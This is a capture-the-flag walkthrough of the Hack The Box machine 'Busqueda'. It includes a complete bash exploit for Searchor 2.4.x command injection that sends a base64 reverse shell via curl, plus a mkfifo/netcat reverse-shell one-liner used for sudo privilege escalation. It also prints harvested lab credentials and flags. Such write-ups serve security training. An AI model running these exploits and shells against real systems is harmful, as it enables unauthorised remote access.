---
title: "Busqueda from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Busqueda from HTB
[page](https://app.hackthebox.com/machines/Busqueda)
`Nmap`gave this:
```bash
$ nmap -sCV --min-rate 4000 -Pn -p- 10.10.11.208
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 05:32 +04
Nmap scan report for 10.10.11.208
Host is up (0.085s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp    open     http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
```
Add this to `/etc/hosts`file:
```
10.10.11.208 searcher.htb
```
Then proceed to site.
On the bottom it says that website is using `Flask` and `Searchor` version `2.4.0` .
Search vulnerability for that version and first thing i got was this code from `Github repository`:
```bash
#!/bin/bash -

default_port="9001"
port="${3:-$default_port}"
rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i')) # junky comment"
plus="+"

echo "---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---"

if [ -z "${evil_cmd##*$plus*}" ]
then
    evil_cmd=$(echo ${evil_cmd} | sed -r 's/[+]+/%2B/g')
fi

if [ $# -ne 0 ]
then
    echo "[*] Input target is $1"
    echo "[*] Input attacker is $2:${port}"
    echo "[*] Run the Reverse Shell... Press Ctrl+C after successful connection"
    curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
else
    echo "[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example:

./exploit.sh <TARGET> <ATTACKER> <PORT> [9001 by default]"
fi
```
and to run it you need to do this:
```bash
/exploit.sh <site_name> <your_ip> <port>
```
Run that with `NetCat`and you will get the connection:
```bash
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.208] 46656
bash: cannot set terminal process group (1648): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ ls
ls
app.py
templates
```
We are in.
The user flag is located in `/home/svc/user.txt:
```bash
$ cat user.txt
cat user.txt
e059d11d9d87ab4920a2b94b7f8bbc80
```
***
User Flag --- e059d11d9d87ab4920a2b94b7f8bbc80
***
Check out the other directories:
```bash
svc@busqueda:/var/www/app$ cd .git
cd .git
svc@busqueda:/var/www/app/.git$ ls
ls
branches
COMMIT_EDITMSG
config
description
HEAD
hooks
index
info
logs
objects
refs
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```
there is Username ---> `cody`      Password ---> jh1usoih2bkjaspwe92
And also there is subdomain of `searcher.htb` ----> `gitea.searcher.htb`, copy that and add to `/etc/hosts`:
```
10.10.11.208 gitea.searcher.htb
```
Go to that site and login as `cody`.
There is nothing special. `TBH i havn't explored it`
Connect to `ssh`with name of `svc`and password of `jh1usoih2bkjaspwe92`.
```bash
$ ssh svc@10.10.11.208
The authenticity of host '10.10.11.208 (10.10.11.208)' can't be established.
ED25519 key fingerprint is SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.208' (ED25519) to the list of known hosts.
svc@10.10.11.208's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug  6 01:47:13 AM UTC 2024

  System load:                      0.080078125
  Usage of /:                       80.2% of 8.26GB
  Memory usage:                     49%
  Swap usage:                       0%
  Processes:                        236
  Users logged in:                  0
  IPv4 address for br-c954bf22b8b2: 172.20.0.1
  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1
  IPv4 address for br-fba5a3e31476: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.208
  IPv6 address for eth0:            dead:beef::250:56ff:fe94:65a3


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Apr  4 17:02:09 2023 from 10.10.14.19
svc@busqueda:~$ ls
user.txt
```
We are in. Now check what you can do with `root`permission.
```bash
$ sudo -l
[sudo] password for svc:
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```
If you run the command given by the `sudo -l` you will get kind of help:
```python
$ /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```
Run the commands one-by-one and one you will need is `docker-inspect`, because it reads something that you will need to access the `admin` repository in `gitea.searcher.htb`. It will need certain type of commands because it is `docker`:
```python
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
```
This will list bunch of text and you will need to search for `GITEA_database_` user and password:
```
   "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],
```
User ---- `gitea`
Password --- `yuiu1hoiu4i5ho1uh`
According to the information provided [here](https://docs.docker.com/config/formatting/), Docker leverages Go templates that enable users to modify the output format of specific commands. The website specifically mentions the usage of the `{{json .}}` formatting template, which renders all the information about the container in the `JSON` format. Thus, we can use `{{json .}}` as the format argument required by the docker-inspect argument of the script.
To read the `JSON` output conveniently, we can use `jq` to parse the `JSON` output into a readable format. `jq` can be installed using the following command, however, it is already present on the target machine.
Now go to `gitea.searcher.htb`and login as
Username ---> `administrator`
Password ---> `yuiu1hoiu4i5ho1uh`
and you will see the repository named `scripts`where is located scripts which you will need to use to get the root.
If you run the third `full-checkup`it access the running docker and get's the information from it. So if we change that file with some other file that will be in other directory that will have the code to execute `reverse-shell`for us to get connection, it's going to be solved.
To think logically code gives us three choices and all of them are scripts. `You can --ls-- the directory the full-checkup is named full-checkup.sh`.We have to create file named `full.checkup.sh`in other directory and give it the reverse shell.
```
$ echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> <port> >/tmp/f" > /tmp/full-checkup.sh
```
So the file is in `/tmp`directory. Use `chmod +x`to make it executable. Then run it with the same code you ran it before but now you should be in the `/tmp`directory:
```python
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```
***
Don't forget to open `NetCat`on you port.
***
```bash
$ nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.208] 35592
# ls
f
full-checkup.sh
snap-private-tmp
systemd-private-db88f2932a09492e8a045aee99a137bc-apache2.service-V1REUq
systemd-private-db88f2932a09492e8a045aee99a137bc-ModemManager.service-FPvDjx
systemd-private-db88f2932a09492e8a045aee99a137bc-systemd-logind.service-Q7yHxg
systemd-private-db88f2932a09492e8a045aee99a137bc-systemd-resolved.service-xVNwz1
systemd-private-db88f2932a09492e8a045aee99a137bc-systemd-timesyncd.service-tWB19h
vmware-root_787-4290625459
# cd /root
# ls
ecosystem.config.js
root.txt
scripts
snap
# cat root.txt
26b8ae6da611ba28b3b7fd2743e51ff3
```
***
The Root Flag is: 26b8ae6da611ba28b3b7fd2743e51ff3
***
![](/assets/images/Screenshot from 2024-08-06 06-02-20.png)
